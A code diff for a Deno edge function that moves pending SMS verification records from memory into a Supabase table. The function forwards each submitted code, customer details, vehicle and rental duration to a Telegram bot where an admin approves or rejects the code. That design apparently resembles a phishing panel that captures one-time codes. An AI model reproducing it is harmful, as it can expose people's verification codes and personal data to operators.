@@ -1,20 +1,10 @@
 import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
+import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4';
 
 const corsHeaders = {
   'Access-Control-Allow-Origin': '*',
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
-
-// Simple in-memory store for pending verifications
-// In production, this should be stored in a database
-const pendingVerifications = new Map<string, {
-  status: 'pending' | 'approved' | 'rejected',
-  code: string,
-  customerInfo: any,
-  vehicle: any,
-  duration: any,
-  timestamp: number
-}>();
 
 serve(async (req) => {
   if (req.method === 'OPTIONS') {
@@ -22,6 +12,11 @@ serve(async (req) => {
   }
 
   try {
+    const supabase = createClient(
+      Deno.env.get('SUPABASE_URL')!,
+      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
+    );
+
     const { userId, code, customerInfo, vehicle, duration } = await req.json();
 
     console.log('SMS verification request:', { userId, code, customerInfo: customerInfo?.fullName });
@@ -39,15 +34,31 @@ serve(async (req) => {
     // Generate verification ID
     const verificationId = `verify_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
 
-    // Store verification in memory
-    pendingVerifications.set(verificationId, {
-      status: 'pending',
-      code,
-      customerInfo,
-      vehicle,
-      duration,
-      timestamp: Date.now()
-    });
+    // Store verification in database
+    const { data: verificationData, error: dbError } = await supabase
+      .from('verification_requests')
+      .insert({
+        verification_id: verificationId,
+        user_id: userId,
+        code: code,
+        customer_info: customerInfo,
+        vehicle: vehicle,
+        duration: duration,
+        status: 'pending'
+      })
+      .select()
+      .single();
+
+    if (dbError) {
+      console.error('Database error:', dbError);
+      return new Response(
+        JSON.stringify({ success: false, message: 'Failed to store verification request' }),
+        { 
+          status: 500, 
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
+        }
+      );
+    }
 
     // Send message to Telegram with admin buttons
     const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
@@ -135,6 +146,3 @@ Please verify if this code is correct:`;
     );
   }
 });
-
-// Export the pending verifications for use by other functions
-export { pendingVerifications };
